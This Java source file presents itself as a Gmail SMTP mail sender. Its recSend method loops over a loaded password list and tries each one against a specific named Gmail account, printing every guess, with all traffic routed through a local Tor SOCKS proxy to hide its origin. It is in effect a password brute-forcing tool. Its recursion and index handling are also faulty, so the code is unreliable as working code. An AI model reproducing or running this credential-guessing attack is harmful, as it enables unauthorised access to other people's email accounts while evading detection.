package m_mail_app;

import com.sun.mail.smtp.SMTPTransport;
import javax.net.ssl.*;
import java.security.Security;
import java.util.Arrays;
import java.util.Date;
import java.util.HashSet;
import java.util.List;
import java.util.Properties;
import java.util.Random;
import java.util.Set;

import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Session;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import java.util.*;

public class SendGoogle {
	
	Utility utl = new Utility();

    public SendGoogle() {
    
    }
    
    /**
     * Send email using GMail SMTP server.
     *
     * @param username GMail username
     * @param password GMail password
     * @param recipientEmail TO recipient
     * @param title title of the message
     * @param message message to be sent
     * @throws AddressException if the email address parse failed
     * @throws MessagingException if the connection is dead or not in the connected state or if the message is not a MimeMessage
     */
    
    public static void Send(final String username, final String password, String recipientEmail, String title, String message) throws AddressException, MessagingException {
        SendGoogle.Send(username, password, recipientEmail, "", title, message);
       
    }

    /**
     * Send email using GMail SMTP server.
     *
     * @param username GMail username
     * @param password GMail password
     * @param recipientEmail TO recipient
     * @param ccEmail CC recipient. Can be empty if there is no CC recipient
     * @param title title of the message
     * @param message message to be sent
     * @throws AddressException if the email address parse failed
     * @throws MessagingException if the connection is dead or not in the connected state or if the message is not a MimeMessage
     */
    public static void Send(final String username, final String password, String recipientEmail, String ccEmail, String title, String message) throws AddressException, MessagingException {
        
    	//Security.addProvider(new com.sun.net.ssl.internal.ssl.Provider());
        final String SSL_FACTORY = "javax.net.ssl.SSLSocketFactory";

        // Get a Properties object
        
        Properties props = System.getProperties();
        
        //Set Proxies => socks Tor service
        props.setProperty("proxySet","true");
        props.setProperty("socksProxyHost","localhost");
        props.setProperty("socksProxyPort","9050");
        
        props.setProperty("mail.smtps.host", "smtp.gmail.com"); 
        props.setProperty("mail.smtp.socketFactory.class", SSL_FACTORY);
        props.setProperty("mail.smtp.socketFactory.fallback", "false");
        props.setProperty("mail.smtp.port", "465");
        props.setProperty("mail.smtp.socketFactory.port", "465"); 
        props.setProperty("mail.smtps.auth", "true");

        /*
        If set to false, the QUIT command is sent and the connection is immediately closed. If set 
        to true (the default), causes the transport to wait for the response to the QUIT command.

        ref :   http://java.sun.com/products/javamail/javadocs/com/sun/mail/smtp/package-summary.html
                http://forum.java.sun.com/thread.jspa?threadID=5205249
                smtpsend.java - demo program from javamail
        */
        props.put("mail.smtps.quitwait", "false");

        Session session = Session.getInstance(props, null);

        // -- Create a new message --
        final MimeMessage msg = new MimeMessage(session);

        // -- Set the FROM and TO fields --
        msg.setFrom(new InternetAddress(username));
        msg.setRecipients(Message.RecipientType.TO, InternetAddress.parse(recipientEmail, false));

        if (ccEmail.length() > 0) {
            msg.setRecipients(Message.RecipientType.CC, InternetAddress.parse(ccEmail, false));
        }

        msg.setSubject(title);
        msg.setText(message, "utf-8");
        msg.setSentDate(new Date());

        SMTPTransport t = (SMTPTransport)session.getTransport("smtps");

        t.connect("smtp.gmail.com", username, password);
        t.sendMessage(msg, msg.getAllRecipients());      
        t.close();
    }
    
    
   public void recSend(int i){
	
	   utl.loadPasswords();
       int index = utl.passwords.size();
	
    	try{
    						
    		while(i < index){
        	i++;
        	recSend(i);       	
        	Send("deividas777@gmail.com", utl.passwords.get(i), "javatest56789@gmail.com", "", "Do you assignment", "Does it work or no?");
        	System.out.println(utl.passwords.get(i));
        	utl.oneSec();
        	utl.passwords.remove(i);
  
        	
    		}
        	}catch(Exception e){
        		System.out.println(e.getMessage() + "Password: " + utl.passwords.get(i).toString() + " Left: " + index );
        		
        	}  

        }
    
    
    public static void main(String[] args){
    	  SendGoogle google = new SendGoogle();
	   	    google.recSend(-1);
    	
    }
    
    
}